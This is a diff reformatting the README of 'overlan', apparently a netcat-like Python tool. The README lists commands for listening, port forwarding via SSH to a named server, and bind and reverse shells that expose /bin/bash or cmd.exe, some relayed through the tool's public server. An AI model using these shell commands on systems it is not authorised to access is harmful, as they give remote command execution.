@@ -21,31 +21,30 @@ For full documentation visit [Overlan](https://github.com/YannBouyeron/overlan).
 
 ## Install
 
-=== "Unix"
+Unix:
 
-	```
 	pip install overlan
 	
 	# or
 
 	python3 -m pip install overlan
-	```
+	
 
-=== "Windows"
+Windows:
 
-	```py -m pip install overlan
-	```
+	py -m pip install overlan
+	
 
 
-=== "Git"
+Git:
 
-	```
+
 	git clone https://github.com/YannBouyeron/overlan
 
 	cd overlan
 
 	python3 setup.py install
-	```
+	
 
 
 ## Commands Line Interface
@@ -53,64 +52,84 @@ For full documentation visit [Overlan](https://github.com/YannBouyeron/overlan).
 
 #### Listen
 
-* `overlan -l 4444` - Listen on localhost port 4444
-* `overlan -l 4444 -R 8888` - Listen on port 4444 and remote forward to overlan server port 8888
+Listen on localhost port 4444
+	
+	overlan -l 4444
+
+Listen on port 4444 and remote forward to overlan server port 8888
+	
+	overlan -l 4444 -R 8888
 
 #### Connect
 
-* `overlan localhost 4444` - Connect to localhost port 4444
-* `overlan overlan 4444` - Connect to overlan server port 4444
+Connect to localhost port 4444
+	
+	overlan localhost 4444
+
+Connect to overlan server port 4444
+	
+	overlan overlan 4444
 
 #### Port forwarding
 
-=== "Overlan"
+Overlan
 
-	* `overlan 4444 -R 8888` - Remote forward localhost 4444 to overlan server port 8888
-	* `overlan 8888 -L 4444` - Local forward overlan server port 8888 to localhost 4444
+Remote forward localhost 4444 to overlan server port 8888
 
-=== "SSH"
+	overlan 4444 -R 8888
 
-	* `ssh -N -R 8888:localhost:4444 overlan@141.94.203.12 -p 22` - Remote forward localhost 4444 to overlan server port 8888 
-	* `ssh -N -L 4444:localhost:8888 overlan@141.94.203.12 -p 22` - Local forward localhost 4444 to overlan server port 8888 
+Local forward overlan server port 8888 to localhost 4444
+
+	overlan 8888 -L 4444
+
+SSH
+
+Remote forward localhost 4444 to overlan server port 8888 
+
+	ssh -N -R 8888:localhost:4444 overlan@141.94.203.12 -p 22
+
+Local forward localhost 4444 to overlan server port 8888 
+
+	ssh -N -L 4444:localhost:8888 overlan@141.94.203.12 -p 22
 
 #### Bind Shell
 
-=== "Unix"
+Unix
 
-	* `overlan -l 4444 -e /bin/bash` - BindShell listen on localhost port 4444.
-	* `overlan -l 4444 -e /bin/bash -R 8888` - BindShell listen on port 4444 and remote forward to overlan server port 8888.
+`overlan -l 4444 -e /bin/bash` - BindShell listen on localhost port 4444.
+`overlan -l 4444 -e /bin/bash -R 8888` - BindShell listen on port 4444 and remote forward to overlan server port 8888.
 	
-	* `overlan -l 4444 -e /bin/bash -k mypassowrd` - Password protected BindShell listen on localhost 4444.
-	* `overlan -l 4444 -e /bin/bash -k mypassword -R 8888` - Password protected BindShell listen on port 4444 and remote forward to overlan server port 8888.
+`overlan -l 4444 -e /bin/bash -k mypassowrd` - Password protected BindShell listen on localhost 4444.
+`overlan -l 4444 -e /bin/bash -k mypassword -R 8888` - Password protected BindShell listen on port 4444 and remote forward to overlan server port 8888.
 
-=== "Windows"
+Windows
 
-	* `overlan -l 4444 -e cmd.exe` - BindShell listen on localhost port 4444.
-	* `overlan -l 4444 -e cmd.exe -R 8888` - BindShell listen on port 4444 and remote forward to overlan server port 8888.
+`overlan -l 4444 -e cmd.exe` - BindShell listen on localhost port 4444.
+`overlan -l 4444 -e cmd.exe -R 8888` - BindShell listen on port 4444 and remote forward to overlan server port 8888.
 	
-	* `overlan -l 4444 -e cmd.exe -k mypassowrd` - Password protected BindShell listen on localhost port 4444.
-	* `overlan -l 4444 -e cmd.exe -k mypassword -R 8888` - Password protected BindShell listen on port 4444 and remote forward to overlan server port 8888.
+`overlan -l 4444 -e cmd.exe -k mypassowrd` - Password protected BindShell listen on localhost port 4444.
+`overlan -l 4444 -e cmd.exe -k mypassword -R 8888` - Password protected BindShell listen on port 4444 and remote forward to overlan server port 8888.
 
 #### Reverse Shell
 
-=== "Unix"
+Unix
 
-	* `overlan localhost 4444 -e /bin/bash` - ReverseShell connect to listener on localhost port 4444.
-	* `overlan overlan 4444 -e /bin/bash` - ReverseShell connect to listener on overlan server port 4444.
-	* `overlan localhost 4444 -e /bin/bash -k mypassowrd` - Password protected ReverseShell connect to localhost port 4444.
-	* `overlan overlan 4444 -e /bin/bash -k mypassowrd` - Password protected ReverseShell connect to overlan server port 4444.
+`overlan localhost 4444 -e /bin/bash` - ReverseShell connect to listener on localhost port 4444.
+`overlan overlan 4444 -e /bin/bash` - ReverseShell connect to listener on overlan server port 4444.
+`overlan localhost 4444 -e /bin/bash -k mypassowrd` - Password protected ReverseShell connect to localhost port 4444.
+`overlan overlan 4444 -e /bin/bash -k mypassowrd` - Password protected ReverseShell connect to overlan server port 4444.
 
-=== "Windows"
+Windows
 
-	* `overlan localhost 4444 -e cmd.exe` - ReverseShell connect to listener on localhost port 4444.
-	* `overlan overlan 4444 -e cmd.exe` - ReverseShell connect to listener on overlan server port 4444.
-	* `overlan localhost 4444 -e cmd.exe -k mypassowrd` - Password protected ReverseShell connect to localhost port 4444.
-	* `overlan overlan 4444 -e cmd.exe -k mypassowrd` - Password protected ReverseShell connect to overlan server port 4444.
+`overlan localhost 4444 -e cmd.exe` - ReverseShell connect to listener on localhost port 4444.
+`overlan overlan 4444 -e cmd.exe` - ReverseShell connect to listener on overlan server port 4444.
+`overlan localhost 4444 -e cmd.exe -k mypassowrd` - Password protected ReverseShell connect to localhost port 4444.
+`overlan overlan 4444 -e cmd.exe -k mypassowrd` - Password protected ReverseShell connect to overlan server port 4444.
 
 
 ## Help
 
-* `overlan -h` - Print help message and exit.
+`overlan -h` - Print help message and exit.
 
 ```
 usage: overlan [-h] [-l] [-e EXECUTE] [-c] [-R REMOTE] [-L LOCAL] [-k KEY]
